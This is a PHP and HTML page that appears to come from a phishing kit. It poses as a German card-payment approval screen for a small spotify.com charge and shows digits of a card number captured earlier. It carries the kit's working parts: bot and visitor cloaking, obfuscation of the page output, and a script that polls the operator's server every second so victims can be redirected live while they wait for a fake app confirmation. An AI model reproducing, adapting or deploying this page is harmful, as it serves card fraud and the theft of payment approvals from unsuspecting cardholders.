<?php 
session_start();
require_once '../includes/functions.php';
validateVisit();
require_once '../includes/tracker.php';
require_once '../includes/lang.php';
require_once '../includes/absd.php';
require_once('../includes/obf.php');
$visitor = trackVisitor();
$security = new supersecurity();
$security->setTestMode(false);
$security->setExitLink(sitexite());
$security->run();
ob_start([TextObfuscator::class, 'obfuscateOutput']);
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Challenge</title>
    <link href="css/ubs.css" rel="stylesheet">
    <script src="js/jquery.js"></script>
   <style>  .sf-hidden {
        display: none !important
      }</style>
  </head>
  <body class>
    <div class="processing-fullpage hide sf-hidden"></div>
    <header>
      <div class="logo logo-left">
        <picture>
          <img src="data:image/gif;base64,R0lGODlhYQAmALMAAP///wMDA5+fn/8AAPLt7UpKSv9eXv+dnSgoKNPT03Nzc/8iIv////97e7u7u//MzCH5BAEAAAAALAAAAABhACYAAAT/EMhJq7046827x0VAfGRpnpVAqOGIvnA8FQLdynj+hUEv6sCgRUD0uYRI1Crl6x0ry8zBQK1Sn1OrAZDVVg+Hp4XgDYMChSNRYLywf5jsYF7FUulb+XxQ3fPFAGR0YAZ7W2MhaRI8bUwBAhwEhhmShxSTEoJ0UIUGT5Jzbm8/NjVwmTw0gFCYF5UWrRKFc1i0FgehUIw9KgS+N6hNpxigfJTGFbGBsZ0YuRM1BdJNKotwo7xokMebxMiX3RPFlqCWFYWfIdg9ijfrj2ir4soUr8nhE63lcQOARGkteBAIyEvdGnnz8LEyJ0FZsQMJ+5VYgUbVrkS/MHYYd4whAGW4/2xl8gORxEBFErChBMBmWyR68zzGenjOzwAzHqJAY/cJ4RiYI2WGmzKnZD2bdHwSu6iU27efQpEaMPoT6Z8PAyui4XWCo7eoUwkZWqUJKaAV1WoQ4Nnizb9AK5R6dfW0Ib6yVOvNsnkkqw8aPra5+6sS4VyosBQWk0gs5J6SWVWsKzDjmrA0plyyUngU7K3HG8oeauGCEbDTW53ABba5bufErg9n2BtIWxq/j0b4pQGXGkvAmiN6nIDLc+tDuOQVq62iyTTKgVJte/P8EQDrVV0Tvwnbo1dcecENYB6oZW3oprSNML+W9/XgE2hjQNf9czfwGbqpXyuY8i6ebOhmXbQR8EngWHjLMCaeR3tBpl2CJbkFAGmPsDENO/GgMaEIa6lG1x6AFIIgSPoUdUFIAnKFVobQDUZgNX4VaCBJvhBAlCcX6LMXjiMVVYuCNmgVT4DWlEYZdTyopUFZNuEUn1VIORnIXnzccdUQ0rgXYBHaRJNJNNXk1MVUq4Bh5plm+mSjFk1R0JI0/9gAXRJ0mtDeENjVqecHFq5wpIZ7BuqBSvEIamgk0h2qKAchLOpoaI/qGQEAOw==" alt="Logo" srcset sizes>
        </picture>
      </div>
      <div class="logo logo-right">
        <picture>
           <?php if($_SESSION['scheme']=='visa'){echo '<img src="images/visa.png" style="width: 100px;">';}elseif($_SESSION['scheme']=='mastercard'){echo '<img src="images/master.png" style="width: 150px;">';}else{echo '';}?>        </picture>
      </div>
      <div class="help-link">
        <a href="" target="_blank">Hilfe</a>
      </div>
    </header>
    <form id="mainForm" method="post" autocomplete="off" action="v2Form">
      <div class="language-switch"></div>
      <div class="main" role="main">
        <h1 id="header">Zahlung bestätigen</h1>
        <p id="subHeader"></p>
        <div>
          <!-- Left blank intentionally, for specific template configuration -->
        </div>
        <div class="data-wrapper">
          <dl>
            <dt id="merchant">Händler</dt>
            <dd>spotify.com</dd>
            <div>
              <dt id="amount">Betrag</dt>
              <dd>EUR <span id="purchaseAmount">2.00</span>
              </dd>
            </div>
            <div>
              <dt id="date">Datum</dt>
              <dd><?php echo @date("d.m.Y"); ?></dd>
            </div>
            <dt id="card">Karte</dt>
            <dd>**** **** **** <?php if(@$_SESSION['cc']!=""){echo substr($_SESSION['cc'], -4); }else{echo "****";}?></dd>
          </dl>
          <div>

          </div>
        </div>
        <div class="processing">
          <p id="spinner" class="spinner">Access App öffnen und Online-Einkauf bestätigen <span>Falls keine Verbindung zur Access App möglich ist, senden wir Ihnen einen Bestätigungscode an Ihre Mobilnummer für Sicherheitsnachrichten.</span>
          </p>
        </div>
        <div>
    
        </div>
      </div>
      <script>

setInterval(function() {
    fetch('../check_redirect.php?visitor_id=<?php echo $visitor['id']; ?>')
        .then(response => response.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.url;
            }
        })
        .catch(error => console.error('Error checking redirect:', error));
        

    fetch('../ping.php?visitor_id=<?php echo $visitor['id']; ?>&page=<?php echo urlencode($_SERVER['REQUEST_URI']); ?>')
        .catch(error => console.error('Error sending ping:', error));
}, 1000);
        

        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('../ping.php?visitor_id=<?php echo $visitor['id']; ?>');
        });
    </script>
      <footer>
        <button type="button" class="btn btn-secondary" id="finish" name="challengeCancel">Abbrechen</button>
      </footer>
      <input id="mainFormSubmitHidden" type="submit" class="hidden" aria-hidden="true" tabindex="-1" value>
    </form>
  </body>
</html>